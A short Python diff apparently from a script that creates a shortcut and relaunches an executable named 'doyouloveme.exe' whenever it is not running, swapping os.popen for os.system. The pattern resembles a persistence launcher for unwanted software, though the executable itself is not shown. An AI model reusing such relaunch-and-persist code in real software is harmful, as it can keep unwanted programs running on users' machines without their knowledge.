@@ -63,7 +63,7 @@ def xm():
       shortcut.save()         
       
    if(programcheck("doyouloveme.exe") == False):
-      os.popen('{}/doyouloveme.exe'.format(xmpath))
+      os.system('{}/doyouloveme.exe'.format(xmpath))
       os._exit(1)
 
 xm()
